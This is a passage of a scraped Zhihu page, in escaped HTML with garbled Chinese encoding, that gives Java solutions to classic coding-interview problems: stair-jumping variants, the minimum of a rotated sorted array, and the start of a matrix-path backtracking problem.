class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">&lt;=</span> <span class=\"n\">2</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">n</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">pre2</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">pre1</span> <span class=\"o\">=</span> <span class=\"n\">2</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">3</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">pre2</span> <span class=\"o\">+</span> <span class=\"n\">pre1</span><span class=\"o\">;</span>\n        <span class=\"n\">pre2</span> <span class=\"o\">=</span> <span class=\"n\">pre1</span><span class=\"o\">;</span>\n        <span class=\"n\">pre1</span> <span class=\"o\">=</span> <span class=\"n\">result</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">result</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>10.3 è·³å°é˜¶</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/8c82a5b80378478f9484d87d1c5f12a4%3FtpId%3D13%26tqId%3D11161%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>ä¸€åªé’è›™ä¸€æ¬¡å¯ä»¥è·³ä¸Š 1 çº§å°é˜¶ï¼Œä¹Ÿå¯ä»¥è·³ä¸Š 2 çº§ã€‚æ±‚è¯¥é’è›™è·³ä¸Šä¸€ä¸ª n çº§çš„å°é˜¶æ€»å…±æœ‰å¤šå°‘ç§è·³æ³•ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-f3989297ae8963dc82bfbc7454972c4f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"596\" data-rawheight=\"316\" class=\"origin_image zh-lightbox-thumb\" width=\"596\" data-original=\"https://pic4.zhimg.com/v2-f3989297ae8963dc82bfbc7454972c4f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;596&#39; height=&#39;316&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"596\" data-rawheight=\"316\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"596\" data-original=\"https://pic4.zhimg.com/v2-f3989297ae8963dc82bfbc7454972c4f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-f3989297ae8963dc82bfbc7454972c4f_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><p>å½“ n = 1 æ—¶ï¼Œåªæœ‰ä¸€ç§è·³æ³•ï¼š</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-a33d59988474a7ba603621d60fd61f21_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"370\" data-rawheight=\"271\" class=\"content_image\" width=\"370\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;370&#39; height=&#39;271&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"370\" data-rawheight=\"271\" class=\"content_image lazy\" width=\"370\" data-actualsrc=\"https://pic2.zhimg.com/v2-a33d59988474a7ba603621d60fd61f21_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å½“ n = 2 æ—¶ï¼Œæœ‰ä¸¤ç§è·³æ³•ï¼š</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-140e7005187a714779e84db26d4008a4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"555\" class=\"origin_image zh-lightbox-thumb\" width=\"500\" data-original=\"https://pic1.zhimg.com/v2-140e7005187a714779e84db26d4008a4_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;500&#39; height=&#39;555&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"555\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"500\" data-original=\"https://pic1.zhimg.com/v2-140e7005187a714779e84db26d4008a4_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-140e7005187a714779e84db26d4008a4_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>è·³ n é˜¶å°é˜¶ï¼Œå¯ä»¥å…ˆè·³ 1 é˜¶å°é˜¶ï¼Œå†è·³ n-1 é˜¶å°é˜¶ï¼›æˆ–è€…å…ˆè·³ 2 é˜¶å°é˜¶ï¼Œå†è·³ n-2 é˜¶å°é˜¶ã€‚è€Œ n-1 å’Œ n-2 é˜¶å°é˜¶çš„è·³æ³•å¯ä»¥çœ‹æˆå­é—®é¢˜ï¼Œè¯¥é—®é¢˜çš„é€’æ¨å…¬å¼ä¸ºï¼š</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-12de2e2de1129184b762177de051bf48_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"651\" data-rawheight=\"145\" class=\"origin_image zh-lightbox-thumb\" width=\"651\" data-original=\"https://pic1.zhimg.com/v2-12de2e2de1129184b762177de051bf48_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;651&#39; height=&#39;145&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"651\" data-rawheight=\"145\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"651\" data-original=\"https://pic1.zhimg.com/v2-12de2e2de1129184b762177de051bf48_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-12de2e2de1129184b762177de051bf48_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">JumpFloor</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">&lt;=</span> <span class=\"n\">2</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">n</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">pre2</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">pre1</span> <span class=\"o\">=</span> <span class=\"n\">2</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">2</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">pre2</span> <span class=\"o\">+</span> <span class=\"n\">pre1</span><span class=\"o\">;</span>\n        <span class=\"n\">pre2</span> <span class=\"o\">=</span> <span class=\"n\">pre1</span><span class=\"o\">;</span>\n        <span class=\"n\">pre1</span> <span class=\"o\">=</span> <span class=\"n\">result</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">result</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>10.4 å˜æ€è·³å°é˜¶</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/22243d016f6b47f2a6928b4313c85387%3FtpId%3D13%26tqId%3D11162%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>ä¸€åªé’è›™ä¸€æ¬¡å¯ä»¥è·³ä¸Š 1 çº§å°é˜¶ï¼Œä¹Ÿå¯ä»¥è·³ä¸Š 2 çº§... å®ƒä¹Ÿå¯ä»¥è·³ä¸Š n çº§ã€‚æ±‚è¯¥é’è›™è·³ä¸Šä¸€ä¸ª n çº§çš„å°é˜¶æ€»å…±æœ‰å¤šå°‘ç§è·³æ³•ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-76eae365cbe3a7326bdbc90d58e01875_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"586\" data-rawheight=\"350\" class=\"origin_image zh-lightbox-thumb\" width=\"586\" data-original=\"https://pic2.zhimg.com/v2-76eae365cbe3a7326bdbc90d58e01875_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;586&#39; height=&#39;350&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"586\" data-rawheight=\"350\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"586\" data-original=\"https://pic2.zhimg.com/v2-76eae365cbe3a7326bdbc90d58e01875_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-76eae365cbe3a7326bdbc90d58e01875_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><h3>åŠ¨æ€è§„åˆ’</h3><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">JumpFloorII</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">target</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">dp</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">target</span><span class=\"o\">];</span>\n    <span class=\"n\">Arrays</span><span class=\"o\">.</span><span class=\"na\">fill</span><span class=\"o\">(</span><span class=\"n\">dp</span><span class=\"o\">,</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">target</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">j</span> <span class=\"o\">&lt;</span> <span class=\"n\">i</span><span class=\"o\">;</span> <span class=\"n\">j</span><span class=\"o\">++)</span>\n            <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">+=</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">];</span>\n    <span class=\"k\">return</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">target</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">];</span>\n<span class=\"o\">}</span></code></pre></div><h3>æ•°å­¦æ¨å¯¼</h3><p>è·³ä¸Š n-1 çº§å°é˜¶ï¼Œå¯ä»¥ä» n-2 çº§è·³ 1 çº§ä¸Šå»ï¼Œä¹Ÿå¯ä»¥ä» n-3 çº§è·³ 2 çº§ä¸Šå»...ï¼Œé‚£ä¹ˆ</p><div class=\"highlight\"><pre><code class=\"language-text\">f(n-1) = f(n-2) + f(n-3) + ... + f(0)</code></pre></div><p>åŒæ ·ï¼Œè·³ä¸Š n çº§å°é˜¶ï¼Œå¯ä»¥ä» n-1 çº§è·³ 1 çº§ä¸Šå»ï¼Œä¹Ÿå¯ä»¥ä» n-2 çº§è·³ 2 çº§ä¸Šå»... ï¼Œé‚£ä¹ˆ</p><div class=\"highlight\"><pre><code class=\"language-text\">f(n) = f(n-1) + f(n-2) + ... + f(0)</code></pre></div><p>ç»¼ä¸Šå¯å¾—</p><div class=\"highlight\"><pre><code class=\"language-text\">f(n) - f(n-1) = f(n-1)</code></pre></div><p>å³</p><div class=\"highlight\"><pre><code class=\"language-text\">f(n) = 2*f(n-1)</code></pre></div><p>æ‰€ä»¥ f(n) æ˜¯ä¸€ä¸ªç­‰æ¯”æ•°åˆ—</p><div class=\"highlight\"><pre><code class=\"language-text\">public int JumpFloorII(int target) {\n    return (int) Math.pow(2, target - 1);\n}</code></pre></div><h2>11. æ—‹è½¬æ•°ç»„çš„æœ€å°æ•°å­—</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/9f3231a991af4f55b95579b44b7a01ba%3FtpId%3D13%26tqId%3D11159%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>æŠŠä¸€ä¸ªæ•°ç»„æœ€å¼€å§‹çš„è‹¥å¹²ä¸ªå…ƒç´ æ¬åˆ°æ•°ç»„çš„æœ«å°¾ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºæ•°ç»„çš„æ—‹è½¬ã€‚è¾“å…¥ä¸€ä¸ªéé€’å‡æ’åºçš„æ•°ç»„çš„ä¸€ä¸ªæ—‹è½¬ï¼Œè¾“å‡ºæ—‹è½¬æ•°ç»„çš„æœ€å°å…ƒç´ ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-0c0e322c9072f64418c601c1b39381c2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"336\" data-rawheight=\"357\" class=\"content_image\" width=\"336\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;336&#39; height=&#39;357&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"336\" data-rawheight=\"357\" class=\"content_image lazy\" width=\"336\" data-actualsrc=\"https://pic3.zhimg.com/v2-0c0e322c9072f64418c601c1b39381c2_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><p>å°†æ—‹è½¬æ•°ç»„å¯¹åŠåˆ†å¯ä»¥å¾—åˆ°ä¸€ä¸ªåŒ…å«æœ€å°å…ƒç´ çš„æ–°æ—‹è½¬æ•°ç»„ï¼Œä»¥åŠä¸€ä¸ªéé€’å‡æ’åºçš„æ•°ç»„ã€‚æ–°çš„æ—‹è½¬æ•°ç»„çš„æ•°ç»„å…ƒç´ æ˜¯åŸæ•°ç»„çš„ä¸€åŠï¼Œä»è€Œå°†é—®é¢˜è§„æ¨¡å‡å°‘äº†ä¸€åŠï¼Œè¿™ç§æŠ˜åŠæ€§è´¨çš„ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸º O(logN)ï¼ˆä¸ºäº†æ–¹ä¾¿ï¼Œè¿™é‡Œå°† log2N å†™ä¸º logNï¼‰ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-90681c8ff4b123903f547ab8b553596a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"510\" data-rawheight=\"335\" class=\"origin_image zh-lightbox-thumb\" width=\"510\" data-original=\"https://pic3.zhimg.com/v2-90681c8ff4b123903f547ab8b553596a_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;510&#39; height=&#39;335&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"510\" data-rawheight=\"335\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"510\" data-original=\"https://pic3.zhimg.com/v2-90681c8ff4b123903f547ab8b553596a_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-90681c8ff4b123903f547ab8b553596a_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>æ­¤æ—¶é—®é¢˜çš„å…³é”®åœ¨äºç¡®å®šå¯¹åŠåˆ†å¾—åˆ°çš„ä¸¤ä¸ªæ•°ç»„å“ªä¸€ä¸ªæ˜¯æ—‹è½¬æ•°ç»„ï¼Œå“ªä¸€ä¸ªæ˜¯éé€’å‡æ•°ç»„ã€‚æˆ‘ä»¬å¾ˆå®¹æ˜“çŸ¥é“éé€’å‡æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸€å®šå°äºç­‰äºæœ€åä¸€ä¸ªå…ƒç´ ã€‚</p><p>é€šè¿‡ä¿®æ”¹äºŒåˆ†æŸ¥æ‰¾ç®—æ³•è¿›è¡Œæ±‚è§£ï¼ˆl ä»£è¡¨ lowï¼Œm ä»£è¡¨ midï¼Œh ä»£è¡¨ highï¼‰ï¼š</p><ul><li>å½“ nums[m] &lt;= nums[h] æ—¶ï¼Œè¡¨ç¤º [m, h] åŒºé—´å†…çš„æ•°ç»„æ˜¯éé€’å‡æ•°ç»„ï¼Œ[l, m] åŒºé—´å†…çš„æ•°ç»„æ˜¯æ—‹è½¬æ•°ç»„ï¼Œæ­¤æ—¶ä»¤ h = mï¼›</li><li>å¦åˆ™ [m + 1, h] åŒºé—´å†…çš„æ•°ç»„æ˜¯æ—‹è½¬æ•°ç»„ï¼Œä»¤ l = m + 1ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">minNumberInRotateArray</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">l</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">l</span> <span class=\"o\">&lt;</span> <span class=\"n\">h</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">m</span> <span class=\"o\">=</span> <span class=\"n\">l</span> <span class=\"o\">+</span> <span class=\"o\">(</span><span class=\"n\">h</span> <span class=\"o\">-</span> <span class=\"n\">l</span><span class=\"o\">)</span> <span class=\"o\">/</span> <span class=\"n\">2</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">m</span><span class=\"o\">]</span> <span class=\"o\">&lt;=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">h</span><span class=\"o\">])</span>\n            <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">m</span><span class=\"o\">;</span>\n        <span class=\"k\">else</span>\n            <span class=\"n\">l</span> <span class=\"o\">=</span> <span class=\"n\">m</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">l</span><span class=\"o\">];</span>\n<span class=\"o\">}</span></code></pre></div><p>å¦‚æœæ•°ç»„å…ƒç´ å…è®¸é‡å¤ï¼Œä¼šå‡ºç°ä¸€ä¸ªç‰¹æ®Šçš„æƒ…å†µï¼šnums[l] == nums[m] == nums[h]ï¼Œæ­¤æ—¶æ— æ³•ç¡®å®šè§£åœ¨å“ªä¸ªåŒºé—´ï¼Œéœ€è¦åˆ‡æ¢åˆ°é¡ºåºæŸ¥æ‰¾ã€‚ä¾‹å¦‚å¯¹äºæ•°ç»„ {1,1,1,0,1}ï¼Œlã€m å’Œ h æŒ‡å‘çš„æ•°éƒ½ä¸º 1ï¼Œæ­¤æ—¶æ— æ³•çŸ¥é“æœ€å°æ•°å­— 0 åœ¨å“ªä¸ªåŒºé—´ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">minNumberInRotateArray</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">l</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">l</span> <span class=\"o\">&lt;</span> <span class=\"n\">h</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">m</span> <span class=\"o\">=</span> <span class=\"n\">l</span> <span class=\"o\">+</span> <span class=\"o\">(</span><span class=\"n\">h</span> <span class=\"o\">-</span> <span class=\"n\">l</span><span class=\"o\">)</span> <span class=\"o\">/</span> <span class=\"n\">2</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">l</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">m</span><span class=\"o\">]</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">m</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">h</span><span class=\"o\">])</span>\n            <span class=\"k\">return</span> <span class=\"n\">minNumber</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"n\">l</span><span class=\"o\">,</span> <span class=\"n\">h</span><span class=\"o\">);</span>\n        <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">m</span><span class=\"o\">]</span> <span class=\"o\">&lt;=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">h</span><span class=\"o\">])</span>\n            <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">m</span><span class=\"o\">;</span>\n        <span class=\"k\">else</span>\n            <span class=\"n\">l</span> <span class=\"o\">=</span> <span class=\"n\">m</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">l</span><span class=\"o\">];</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"nf\">minNumber</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">l</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">h</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">l</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">h</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">])</span>\n            <span class=\"k\">return</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">];</span>\n    <span class=\"k\">return</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">l</span><span class=\"o\">];</span>\n<span class=\"o\">}</span></code></pre></div><h2>12. çŸ©é˜µä¸­çš„è·¯å¾„</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/c61c6999eecb4b8f88a98f66b273a3cc%3FtpId%3D13%26tqId%3D11218%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>åˆ¤æ–­åœ¨ä¸€ä¸ªçŸ©é˜µä¸­æ˜¯å¦å­˜åœ¨ä¸€æ¡åŒ…å«æŸå­—ç¬¦ä¸²æ‰€æœ‰å­—ç¬¦çš„è·¯å¾„ã€‚è·¯å¾„å¯ä»¥ä»çŸ©é˜µä¸­çš„ä»»æ„ä¸€ä¸ªæ ¼å­å¼€å§‹ï¼Œæ¯ä¸€æ­¥å¯ä»¥åœ¨çŸ©é˜µä¸­å‘ä¸Šä¸‹å·¦å³ç§»åŠ¨ä¸€ä¸ªæ ¼å­ã€‚å¦‚æœä¸€æ¡è·¯å¾„ç»è¿‡äº†çŸ©é˜µä¸­çš„æŸä¸€ä¸ªæ ¼å­ï¼Œåˆ™è¯¥è·¯å¾„ä¸èƒ½å†è¿›å…¥è¯¥æ ¼å­ã€‚</p><p>ä¾‹å¦‚ä¸‹é¢çš„çŸ©é˜µåŒ…å«äº†ä¸€æ¡ bfce è·¯å¾„ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-8d827a9bd0357a78d1cfde1398c19f5b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"278\" data-rawheight=\"251\" class=\"content_image\" width=\"278\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;278&#39; height=&#39;251&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"278\" data-rawheight=\"251\" class=\"content_image lazy\" width=\"278\" data-actualsrc=\"https://pic4.zhimg.com/v2-8d827a9bd0357a78d1cfde1398c19f5b_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><p>ä½¿ç”¨å›æº¯æ³•ï¼ˆbacktrackingï¼‰è¿›è¡Œæ±‚è§£ï¼Œå®ƒæ˜¯ä¸€ç§æš´åŠ›æœç´¢æ–¹æ³•ï¼Œé€šè¿‡æœç´¢æ‰€æœ‰å¯èƒ½çš„ç»“æœæ¥æ±‚è§£é—®é¢˜ã€‚å›æº¯æ³•åœ¨ä¸€æ¬¡æœç´¢ç»“æŸæ—¶éœ€è¦è¿›è¡Œå›æº¯ï¼ˆå›é€€ï¼‰ï¼Œå°†è¿™ä¸€æ¬¡æœç´¢è¿‡ç¨‹ä¸­è®¾ç½®çš„çŠ¶æ€è¿›è¡Œæ¸…é™¤ï¼Œä»è€Œå¼€å§‹ä¸€æ¬¡æ–°çš„æœç´¢è¿‡ç¨‹ã€‚ä¾‹å¦‚ä¸‹å›¾ç¤ºä¾‹ä¸­ï¼Œä» f å¼€å§‹ï¼Œä¸‹ä¸€æ­¥æœ‰ 4 ç§æœç´¢å¯èƒ½ï¼Œå¦‚æœå…ˆæœç´¢ bï¼Œéœ€è¦å°† b æ 